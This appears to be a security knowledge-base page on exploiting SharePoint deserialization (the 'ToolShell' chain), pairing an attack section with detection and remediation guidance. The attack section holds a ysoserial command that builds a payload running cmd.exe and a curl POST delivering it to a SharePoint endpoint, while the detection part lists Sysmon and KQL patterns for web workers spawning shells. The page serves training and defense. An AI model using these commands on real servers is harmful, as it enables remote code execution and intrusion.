# [IA-EXPLOIT-002]: BDC Deserialization Vulnerability (SharePoint)

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | IA-EXPLOIT-002 |
| **MITRE ATT&CK v18.1** | [Exploit Public-Facing Application (T1190)](https://attack.mitre.org/techniques/T1190/) |
| **Tactic** | Initial Access |
| **Platforms** | Hybrid AD / SharePoint |
| **Severity** | **Critical** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** Exploiting deserialization flaws in SharePoint's Business Data Connectivity (BDC) or ServerRuntime (related to CVE-2025-53770 / "ToolShell"). Attackers send crafted serialized objects via HTTP POST to endpoints like `_catalogs/masterpage` or `_vti_bin` to execute remote code.
- **Attack Surface:** Internet-facing SharePoint servers in Hybrid environments.
- **Business Impact:** **Remote Code Execution (RCE)** as `IIS AppPool\SharePoint Web Services` (usually a high-privilege service account).

## 3. PREREQUISITES & CONFIGURATION
- **Vulnerable Config:** Unpatched SharePoint Server 2016/2019 exposed to the internet.
- **Tools:**
    - [YSoSerial.net](https://github.com/pwntester/ysoserial.net)
    - Custom Exploit Scripts (ToolShell chain)

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Payload Generation**
Generate a serialized payload using `TypeConfuseDelegate` or a similar gadget chain that works on the target .NET version.

```powershell
.\ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c "cmd.exe /c whoami > C:\temp\pwn.txt"
```

**Step 2: Exploitation**
Send the malicious POST request to a vulnerable endpoint.

```bash
# Example curl command targeting a vulnerable SOAP or REST endpoint
curl -X POST \
    -H "Content-Type: application/xml" \
    -H "X-RequestDigest: [Valid_Digest_If_Needed]" \
    -d @payload.dat \
    https://sharepoint.target.com/_vti_bin/client.svc/ProcessQuery
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 IIS Logs
Look for `POST` requests to specific paths with unusually large bodies or anomalous User-Agents.
*   Paths: `/_vti_bin/client.svc`, `/_catalogs/masterpage`

#### 5.2 Sysmon
Event ID 1 (Process Create) where the IIS Worker Process spawns a shell.

```xml
<RuleGroup name="" groupRelation="or">
  <ProcessCreate onmatch="include">
    <ParentImage condition="end with">w3wp.exe</ParentImage>
    <Image condition="end with">cmd.exe</Image>
    <Image condition="end with">powershell.exe</Image>
  </ProcessCreate>
</RuleGroup>
```

#### 5.3 Sentinel (KQL)
```kusto
DeviceProcessEvents
| where InitiatingProcessFileName =~ "w3wp.exe"
| where FileName in~ ("cmd.exe", "powershell.exe", "certutil.exe")
| project TimeGenerated, DeviceName, FileName, CommandLine
```

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Patching:** Apply the latest SharePoint Security Updates (SUs) immediately. This is the only effective fix for deserialization bugs.
*   **AMSI:** Enable **AMSI integration** for SharePoint (available in newer builds) to help detect malicious scripts running in memory.
*   **WAF:** Configure Web Application Firewall rules to block requests containing serialized .NET object headers or known gadget signatures.

## 7. ATTACK CHAIN
> **Preceding Technique:** [REC-AD-001] (Reconnaissance of SharePoint version)
> **Next Logical Step:** [LAT-AD-001] (Dumping AD creds from SharePoint server)
